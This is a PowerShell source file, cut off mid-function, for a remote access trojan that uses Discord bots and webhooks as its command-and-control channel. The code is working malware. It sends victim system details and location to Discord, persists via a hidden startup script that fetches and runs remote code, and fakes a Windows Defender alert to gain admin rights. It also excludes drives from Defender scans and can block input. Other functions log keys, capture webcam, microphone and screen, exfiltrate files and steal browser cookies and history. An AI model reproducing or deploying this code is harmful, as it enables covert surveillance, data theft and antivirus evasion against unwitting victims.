# Discord C2 Client Script
# Version: 1.5.1
# Description: A PowerShell-based command-and-control (C2) client that uses Discord as a communication channel.
# Setup Instructions:
# 1. Create a Discord bot at https://discord.com/developers/applications/
# 2. Enable all Privileged Gateway Intents on the 'Bot' page.
# 3. On the OAuth2 page, select 'Bot' in Scopes and grant permissions: Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
# 4. Copy the generated OAuth2 URL, open it in a browser, and add the bot to a single Discord server.
# 5. Reset and copy the bot token from the 'Bot' page.
# 6. Insert the token below and ensure the bot is in only one server.

# Configuration
$global:Token = "$tk"  # Replace with your Discord bot token
$global:ParentScriptUrl = "https://is.gd/y92xe4"  # URL for script persistence
$global:HideConsole = 0  # Set to 1 to hide the console window
$global:CreateChannels = 1  # Set to 1 to create new channels on session start
$global:InfoOnConnect = 1  # Set to 1 to send system info on connect
$global:AutoStartJobs = 1  # Set to 1 to start all jobs automatically
$global:Version = "1.5.1"  # Script version
$global:Timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"

# Remove existing persistence script if present
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $global:InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force
}

# Error Handling System with Webhook Reporting
$global:ErrorWebhook = "https://discord.com/api/webhooks/1273395943873450107/BGtPgEvMWW60aW65PWHkV5aRTx2XY8lZeSdTsoxBn5-60GnWngbToICZ5o5MjgnuSaC2"

function Send-ErrorReport {
    param (
        [string]$ErrorMessage,
        [string]$Timestamp = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
    )
    $embed = @{
        username = "$env:COMPUTERNAME"
        tts = $false
        embeds = @(
            @{
                title = ":warning: Error Report"
                description = "An error occurred on **$env:COMPUTERNAME**"
                color = 0xFF0000
                fields = @(
                    @{
                        name = "Timestamp"
                        value = "``````$Timestamp``````"
                        inline = $true
                    },
                    @{
                        name = "Error Message"
                        value = "``````$ErrorMessage``````"
                        inline = $false
                    }
                )
                footer = @{
                    text = "Error Logged"
                }
            }
        )
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Content-Type", "application/json")
    $jsonBody = $embed | ConvertTo-Json -Depth 10 -Compress
    try {
        $wc.UploadString($global:ErrorWebhook, "POST", $jsonBody)
    } catch {
        Write-Host "Failed to send error report to webhook."
    }
}

# Trap all errors and send to webhook
trap {
    $errorMsg = $_.Exception.Message
    $errorStack = $_.ScriptStackTrace
    $fullError = "Message: $errorMsg`nStack Trace: $errorStack"
    Send-ErrorReport -ErrorMessage $fullError
    continue
}

# Helper Functions
function Send-DiscordMessage {
    param (
        [string]$Message,
        [hashtable]$Embed,
        [string]$ChannelID = $global:SessionID
    )
    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:Token")
    $wc.Headers.Add("Content-Type", "application/json")
    
    if ($Embed) {
        $jsonBody = $Embed | ConvertTo-Json -Depth 10 -Compress
        $wc.UploadString($url, "POST", $jsonBody)
    } elseif ($Message) {
        $jsonBody = @{
            "content" = $Message
            "username" = $env:COMPUTERNAME
        } | ConvertTo-Json
        $wc.UploadString($url, "POST", $jsonBody)
    }
}

function Send-DiscordFile {
    param (
        [string]$FilePath,
        [string]$ChannelID = $global:SessionID
    )
    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:Token")
    if (Test-Path $FilePath -PathType Leaf) {
        $wc.UploadFile($url, "POST", $FilePath)
        Write-Host "Attachment sent to Discord: $FilePath"
    } else {
        Write-Host "File not found: $FilePath"
    }
}

function Get-FFmpeg {
    Send-DiscordMessage -Message ":hourglass_flowing_sand: ``Downloading FFmpeg to client... Please wait`` :hourglass_flowing_sand:"
    $path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:Temp"
    if (-not (Test-Path $path)) {
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString($apiUrl)
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
    }
}

function New-DiscordChannelCategory {
    $headers = @{
        'Authorization' = "Bot $global:Token"
    }
    $guildID = $null
    while (-not $guildID) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        Start-Sleep -Seconds 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:Token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
}

function New-DiscordChannel {
    param ([string]$Name)
    $headers = @{
        'Authorization' = "Bot $global:Token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = $Name
        "type" = 0
        "parent_id" = $global:CategoryID
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:Token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    $global:ChannelID = $responseObj.id
}

function Get-SystemInfo {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $geoWatcher.Start()
    while (($geoWatcher.Status -ne 'Ready') -and ($geoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
    $gps = if ($geoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
        $gl = $geoWatcher.Position.Location | Select-Object Latitude, Longitude
        $lat = $gl.Latitude.ToString("F6")
        $lon = $gl.Longitude.ToString("F6")
        "LAT = $lat LONG = $lon"
    }
    $adminPerm = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) { "True" } else { "False" }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $videoCardInfo = Get-WmiObject Win32_VideoController
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $screenSize = "$($screen.Width) x $($screen.Height)"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $osString = "$($systemInfo.Caption)"
    $osArch = "$($systemInfo.OSArchitecture)"
    $ramInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | ForEach-Object { "{0:N1} GB" -f ($_.Sum / 1GB) }
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videoCardInfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale
    $systemLanguage = $systemLocale.Name
    $publicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    $embed = @{
        username = $env:COMPUTERNAME
        tts = $false
        embeds = @(
            @{
                title = ":desktop: $env:COMPUTERNAME | System Information"
                description = "Detailed system information for **$env:COMPUTERNAME**"
                color = 0x00FF00  # Green
                fields = @(
                    @{
                        name = ":bust_in_silhouette: User Information"
                        value = "``````
- Current User: $env:USERNAME
- Email: $email
- Language: $systemLanguage
- Administrator: $adminPerm
``````"
                        inline = $true
                    },
                    @{
                        name = ":floppy_disk: OS Information"
                        value = "``````
- OS: $osString - $ver
- Architecture: $osArch
``````"
                        inline = $true
                    },
                    @{
                        name = ":globe_with_meridians: Network Information"
                        value = "``````
- Public IP: $publicIP
- Location: $gps
``````"
                        inline = $true
                    },
                    @{
                        name = ":gear: Hardware Information"
                        value = "``````
- Processor: $processor
- Memory: $ramInfo
- GPU: $gpu
- Screen Size: $screenSize
``````"
                        inline = $true
                    },
                    @{
                        name = ":information_source: Commands"
                        value = "Type ``Options`` for a list of available commands"
                        inline = $false
                    }
                )
                footer = @{
                    text = "Session Started: $global:Timestamp"
                }
            }
        )
    }
    Send-DiscordMessage -Embed $embed
}

function Hide-Console {
    $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $proc.MainWindowHandle
        $type::ShowWindowAsync($hwnd, 0)
    }
}

# Command Functions
function Show-Options {
    $embed = @{
        username = $env:COMPUTERNAME
        tts = $false
        embeds = @(
            @{
                title = ":tools: $env:COMPUTERNAME | Command List"
                description = "Available commands for controlling **$env:COMPUTERNAME**"
                color = 0x00FF00  # Green
                fields = @(
                    @{
                        name = ":gear: System Commands"
                        value = "``````
- AddPersistance: Add script to startup
- RemovePersistance: Remove from startup
- IsAdmin: Check admin privileges
- Elevate: Attempt to gain admin rights (UAC prompt)
- ExcludeCDrive: Exclude C: from Defender scans
- ExcludeAllDrives: Exclude C:-G: from Defender scans
- EnableIO: Enable keyboard/mouse (admin)
- DisableIO: Disable keyboard/mouse (admin)
- Exfiltrate: Send files (see ExtraInfo)
- Upload: Upload a file (see ExtraInfo)
- Download: Download a file (attach with command)
- StartUvnc: Start UVNC client (e.g., StartUvnc -ip 192.168.1.1 -port 8080)
- SpeechToText: Transcribe audio to Discord
- EnumerateLAN: Show LAN devices (see ExtraInfo)
- NearbyWifi: Show nearby Wi-Fi networks (UAC prompt)
- RecordScreen: Record screen and send to Discord
``````"
                        inline = $true
                    },
                    @{
                        name = ":joker: Prank Commands"
                        value = "``````
- FakeUpdate: Spoof Windows 10 update screen
- Windows93: Start parody Windows 93
- WindowsIdiot: Start fake Windows 95
- SendHydra: Never-ending popups (use kill to stop)
- SoundSpam: Play Windows default sounds
- Message: Send message popup to user
- VoiceMessage: Send voice message to user
- MinimizeAll: Minimize all applications
- EnableDarkMode: Enable system-wide dark mode
- DisableDarkMode: Disable system-wide dark mode
- ShortcutBomb: Create 50 desktop shortcuts
- Wallpaper: Set wallpaper (e.g., Wallpaper -url http://img.com/f4wc)
- Goose: Spawn an annoying goose
- ScreenParty: Start a screen disco
``````"
                        inline = $true
                    },
                    @{
                        name = ":computer: Jobs"
                        value = "``````
- Microphone: Record and send audio clips
- Webcam: Stream webcam images
- Screenshots: Send desktop screenshots
- Keycapture: Capture and send keystrokes
- SystemInfo: Gather and send system info
``````"
                        inline = $true
                    },
                    @{
                        name = ":wrench: Control"
                        value = "``````
- ExtraInfo: Show detailed command examples
- Cleanup: Clear history and temp files
- Kill: Stop a running module (e.g., Exfiltrate)
- PauseJobs: Pause all jobs
- ResumeJobs: Resume all jobs
- Close: Close the session
``````"
                        inline = $true
                    }
                )
                footer = @{
                    text = "Session: $global:Timestamp"
                }
            }
        )
    }
    Send-DiscordMessage -Embed $embed
}

function Show-ExtraInfo {
    $embed = @{
        username = $env:COMPUTERNAME
        tts = $false
        embeds = @(
            @{
                title = ":information_source: $env:COMPUTERNAME | Extra Information"
                description = "Examples and details for advanced commands"
                color = 0x00FF00  # Green
                fields = @(
                    @{
                        name = "PowerShell Commands"
                        value = "``````
Run any PS command, e.g., 'whoami'
Output is returned in the powershell channel
``````"
                        inline = $true
                    },
                    @{
                        name = "Exfiltrate Examples"
                        value = "``````
- Exfiltrate -Path Documents -Filetype png
- Exfiltrate -Filetype log
- Exfiltrate (sends predefined file types)
Searches Desktop, Documents, Downloads, etc.
``````"
                        inline = $true
                    },
                    @{
                        name = "Upload Example"
                        value = "``````
- Upload -Path C:/Path/To/File.txt
Use FolderTree to list files
``````"
                        inline = $true
                    },
                    @{
                        name = "EnumerateLAN Example"
                        value = "``````
- EnumerateLAN -Prefix 192.168.1.
Scans 192.168.1.1 to 192.168.1.254
``````"
                        inline = $true
                    },
                    @{
                        name = "Prank Examples"
                        value = "``````
- Message 'Your Message Here!'
- VoiceMessage 'Your Message Here!'
- Wallpaper -url http://img.com/f4wc
``````"
                        inline = $true
                    },
                    @{
                        name = "Record Example"
                        value = "``````
- RecordScreen -t 100 (records for 100 seconds)
``````"
                        inline = $true
                    },
                    @{
                        name = "Killable Modules"
                        value = "``````
- Exfiltrate
- SendHydra
- SpeechToText
Use 'kill' to stop these
``````"
                        inline = $true
                    }
                )
                footer = @{
                    text = "Session: $global:Timestamp"
                }
            }
        )
    }
    Send-DiscordMessage -Embed $embed
}

function Clear-System {
    Remove-Item "$env:Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    $paths = @("$env:Temp\Image.jpg", "$env:Temp\Screen.jpg", "$env:Temp\Audio.mp3")
    foreach ($path in $paths) {
        if (Test-Path $path) { Remove-Item $path -Force }
    }
    Send-DiscordMessage -Message ":white_check_mark: ``Cleanup completed for $env:COMPUTERNAME`` :white_check_mark:"
}

# Prank Functions
function Start-FakeUpdate {
    $vbs = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $path = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $vbs | Out-File -FilePath $path -Force
    Start-Sleep -Seconds 1
    Start-Process -FilePath $path
    Start-Sleep -Seconds 3
    Remove-Item -Path $path -Force
    Send-DiscordMessage -Message ":arrows_counterclockwise: ``Fake Windows Update displayed`` :arrows_counterclockwise:"
}

function Start-Windows93 {
    $vbs = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $path = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $vbs | Out-File -FilePath $path -Force
    Start-Sleep -Seconds 1
    Start-Process -FilePath $path
    Start-Sleep -Seconds 3
    Remove-Item -Path $path -Force
    Send-DiscordMessage -Message ":arrows_counterclockwise: ``Windows 93 parody launched`` :arrows_counterclockwise:"
}

function Start-WindowsIdiot {
    $vbs = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
    $path = "$env:APPDATA\Microsoft\Windows\1021.vbs"
    $vbs | Out-File -FilePath $path -Force
    Start-Sleep -Seconds 1
    Start-Process -FilePath $path
    Start-Sleep -Seconds 3
    Remove-Item -Path $path -Force
    Send-DiscordMessage -Message ":arrows_counterclockwise: ``Windows Idiot prank launched`` :arrows_counterclockwise:"
}

function Send-Hydra {
    Add-Type -AssemblyName System.Windows.Forms
    Send-DiscordMessage -Message ":arrows_counterclockwise: ``Hydra popups initiated`` :arrows_counterclockwise:"
    function Create-Form {
        $form = New-Object Windows.Forms.Form
        $form.Text = "  __--** HYDRA INFECTION **--__ "
        $form.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Size = New-Object Drawing.Size(300, 170)
        $form.StartPosition = 'Manual'
        $form.BackColor = [System.Drawing.Color]::Black
        $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
        $form.ControlBox = $false
        $form.ForeColor = "#FF0000"
        $text = New-Object Windows.Forms.Label
        $text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear"
        $text.Font = 'Microsoft Sans Serif,14'
        $text.AutoSize = $true
        $text.Location = New-Object System.Drawing.Point(15, 20)
        $close = New-Object Windows.Forms.Button
        $close.Text = "Close?"
        $close.Width = 120
        $close.Height = 35
        $close.BackColor = [System.Drawing.Color]::White
        $close.ForeColor = [System.Drawing.Color]::Black
        $close.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $close.Location = New-Object System.Drawing.Point(85, 100)
        $form.Controls.AddRange(@($text, $close))
        return $form
    }
    while ($true) {
        $form = Create-Form
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
        $messages = Pull-Messages
        if ($messages -match "kill") {
            Send-DiscordMessage -Message ":octagonal_sign: ``Hydra stopped`` :octagonal_sign:"
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        Start-Sleep -Seconds (Get-Random -Minimum 0 -Maximum 2)
    }
}

function Send-Message {
    param ([string]$Message)
    msg.exe * $Message
    Send-DiscordMessage -Message ":arrows_counterclockwise: ``Message sent to user`` :arrows_counterclockwise:"
}

function Start-SoundSpam {
    param ([int]$Interval = 3)
    Send-DiscordMessage -Message ":white_check_mark: ``Playing Windows sounds...`` :white_check_mark:"
    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | ForEach-Object {
        Start-Sleep -Seconds $Interval
        (New-Object Media.SoundPlayer "C:\Windows\Media\$($_.Name)").Play()
    }
    Send-DiscordMessage -Message ":white_check_mark: ``Sound spam completed`` :white_check_mark:"
}

function Send-VoiceMessage {
    param ([string]$Message)
    Add-Type -AssemblyName System.Speech
    $speechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $speechSynth.Speak($Message)
    Send-DiscordMessage -Message ":white_check_mark: ``Voice message sent`` :white_check_mark:"
}

function Minimize-All {
    $shell = New-Object -ComObject Shell.Application
    $shell.MinimizeAll()
    Send-DiscordMessage -Message ":white_check_mark: ``All apps minimized`` :white_check_mark:"
}

function Enable-DarkMode {
    $theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $theme AppsUseLightTheme -Value 0
    Set-ItemProperty $theme SystemUsesLightTheme -Value 0
    Start-Sleep -Seconds 1
    Send-DiscordMessage -Message ":white_check_mark: ``Dark mode enabled`` :white_check_mark:"
}

function Disable-DarkMode {
    $theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
    Set-ItemProperty $theme AppsUseLightTheme -Value 1
    Set-ItemProperty $theme SystemUsesLightTheme -Value 1
    Start-Sleep -Seconds 1
    Send-DiscordMessage -Message ":octagonal_sign: ``Dark mode disabled`` :octagonal_sign:"
}

function Start-ShortcutBomb {
    $n = 0
    while ($n -lt 50) {
        $num = Get-Random
        $appLocation = "C:\Windows\System32\rundll32.exe"
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut("$Home\Desktop\USB Hardware$num.lnk")
        $shortcut.TargetPath = $appLocation
        $shortcut.Arguments = "shell32.dll,Control_RunDLL hotplug.dll"
        $shortcut.IconLocation = "hotplug.dll,0"
        $shortcut.Description = "Device Removal"
        $shortcut.WorkingDirectory = "C:\Windows\System32"
        $shortcut.Save()
        Start-Sleep -Milliseconds 200
        $n++
    }
    Send-DiscordMessage -Message ":white_check_mark: ``50 shortcuts created on desktop`` :white_check_mark:"
}

function Set-Wallpaper {
    param ([string]$Url)
    $outputPath = "$env:Temp\img.jpg"
    $wallpaperStyle = 2
    Invoke-WebRequest -Uri $Url -OutFile $outputPath
    $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
    Add-Type -TypeDefinition $signature
    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $SPIF_SENDCHANGE = 0x02
    [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    Send-DiscordMessage -Message ":white_check_mark: ``Wallpaper set`` :white_check_mark:"
}

function Start-Goose {
    $url = "https://github.com/wormserv/assets/raw/main/Goose.zip"
    $tempFolder = $env:Temp
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    Send-DiscordMessage -Message ":white_check_mark: ``Annoying goose spawned`` :white_check_mark:"
}

function Start-ScreenParty {
    Start-Process PowerShell.exe -ArgumentList "-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d=10;`$i=100;`$1='Black';`$2='Green';`$3='Red';`$4='Yellow';`$5='Blue';`$6='white';`$st=Get-Date;while((Get-Date)-lt`$st.AddSeconds(`$d)){`$t=1;while(`$t-lt7){`$f=New-Object System.Windows.Forms.Form;`$f.BackColor=`$c;`$f.FormBorderStyle='None';`$f.WindowState='Maximized';`$f.TopMost=`$true;if(`$t-eq1){`$c=`$1}if(`$t-eq2){`$c=`$2}if(`$t-eq3){`$c=`$3}if(`$t-eq4){`$c=`$4}if(`$t-eq5){`$c=`$5}if(`$t-eq6){`$c=`$6}`$f.BackColor=`$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}"
    Send-DiscordMessage -Message ":white_check_mark: ``Screen party started`` :white_check_mark:"
}

# Persistence Functions
function Add-Persistence {
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $scriptContent = Invoke-WebRequest -Uri $global:ParentScriptUrl -UseBasicParsing
    $scriptContent.Content | Out-File -FilePath $newScriptPath -Force
    "`$tk = `"$global:Token`"" | Out-File -FilePath $newScriptPath -Force -Append
    $vbs = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $vbs | Out-File -FilePath $vbsPath -Force
    Send-DiscordMessage -Message ":white_check_mark: ``Persistence added`` :white_check_mark:"
}

function Remove-Persistence {
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs" -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1" -ErrorAction SilentlyContinue
    Send-DiscordMessage -Message ":octagonal_sign: ``Persistence removed`` :octagonal_sign:"
}

# Admin Functions
function Test-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
    Send-DiscordMessage -Message (if ($isAdmin) { ":white_check_mark: ``You are admin`` :white_check_mark:" } else { ":octagonal_sign: ``Not admin`` :octagonal_sign:" })
}

function Request-Elevation {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $form = New-Object Windows.Forms.Form
    $form.Width = 400
    $form.Height = 180
    $form.TopMost = $true
    $form.StartPosition = 'CenterScreen'
    $form.Text = 'Windows Defender Alert'
    $form.Font = 'Microsoft Sans Serif,10'
    $form.Icon = [System.Drawing.SystemIcons]::Information
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    $label = New-Object Windows.Forms.Label
    $label.Width = 380
    $label.Height = 80
    $label.TextAlign = 'MiddleCenter'
    $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
    $label.Location = New-Object System.Drawing.Point(10, 10)
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
    $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
    $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
    $graphics.DrawImage($icon.ToBitmap(), 0, 0, 16, 16)
    $graphics.Dispose()
    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "  Apply Fix"
    $okButton.Width = 110
    $okButton.Height = 25
    $okButton.Location = New-Object System.Drawing.Point(185, 110)
    $okButton.Image = $resizedIcon
    $okButton.TextImageRelation = 'ImageBeforeText'
    $cancelButton = New-Object Windows.Forms.Button
    $cancelButton.Text = "Cancel"
    $cancelButton.Width = 80
    $cancelButton.Height = 25
    $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
    $form.Controls.AddRange(@($label, $okButton, $cancelButton))
    $okButton.Add_Click({
        $form.Close()
        $vbs = @"
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName, """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$global:Token'; irm $global:ParentScriptUrl | iex", 0, True
"@
        $vbsPath = "C:\Windows\Tasks\service.vbs"
        $vbs | Out-File -FilePath $vbsPath -Force
        & $vbsPath
        Start-Sleep -Seconds 7
        Remove-Item -Path $vbsPath -ErrorAction SilentlyContinue
        Send-DiscordMessage -Message ":white_check_mark: ``UAC prompt sent to user`` :white_check_mark:"
    })
    $cancelButton.Add_Click({ $form.Close() })
    [void]$form.ShowDialog()
}

function Exclude-CDrive {
    Add-MpPreference -ExclusionPath C:\
    Send-DiscordMessage -Message ":white_check_mark: ``C: drive excluded from Defender scans`` :white_check_mark:"
}

function Exclude-AllDrives {
    'C:', 'D:', 'E:', 'F:', 'G:' | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
    Send-DiscordMessage -Message ":white_check_mark: ``Drives C: to G: excluded from Defender scans`` :white_check_mark:"
}

function Enable-IO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    Send-DiscordMessage -Message ":white_check_mark: ``Keyboard and mouse enabled`` :white_check_mark:"
}

function Disable-IO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    Send-DiscordMessage -Message ":octagonal_sign: ``Keyboard and mouse disabled`` :octagonal_sign:"
}

# Job Scriptblocks
$lootJob = {
    param ([string]$Token, [string]$LootID)
    function Send-LootFile {
        param ([string]$FilePath)
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        if (Test-Path $FilePath -PathType Leaf) {
            $wc.UploadFile($url, "POST", $FilePath)
            Write-Host "Attachment sent to Discord: $FilePath"
        }
    }
    function Send-LootMessage {
        param ([string]$Message)
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $Token")
        $jsonBody = @{
            "content" = $Message
            "username" = $env:COMPUTERNAME
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $wc.UploadString($url, "POST", $jsonBody)
    }
    function Get-BrowserData {
        Send-LootMessage -Message ":arrows_counterclockwise: ``Collecting browser data files...`` :arrows_counterclockwise:"
        $temp = [System.IO.Path]::GetTempPath()
        $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
        $dirs = @{
            'google' = Join-Path -Path $tempFolder -ChildPath 'google'
            'firefox' = Join-Path -Path $tempFolder -ChildPath 'firefox'
            'edge' = Join-Path -Path $tempFolder -ChildPath 'edge'
        }
        New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
        foreach ($dir in $dirs.Values) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
        function Copy-Files {
            param ([string]$Source, [string]$Dest, [switch]$Db)
            $files = Get-ChildItem -Path $Source -Filter '*' -Recurse | Where-Object { $_.Name -in @('Web Data', 'History', 'formhistory.sqlite', 'places.sqlite', 'cookies.sqlite') }
            foreach ($file in $files) {
